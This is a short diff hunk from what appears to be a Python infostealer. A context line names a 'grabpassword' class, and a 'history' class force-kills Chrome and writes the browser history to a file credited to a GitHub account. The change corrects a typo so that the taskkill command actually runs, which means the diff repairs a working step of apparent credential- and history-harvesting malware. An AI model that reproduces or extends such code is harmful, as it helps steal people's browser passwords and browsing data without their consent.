@@ -360,7 +360,7 @@ class grabpassword():
 class history():
     def __init__(self):
         if "chrome.exe" in (p.name() for p in psutil.process_iter()):
-            os.sytem("taskkill /im chrome.exe /f")
+            os.system("taskkill /im chrome.exe /f")
 
         with open("google-history.txt", "w") as f:
             f.write("https://github.com/Smug246 | Google Chrome History\n\n")
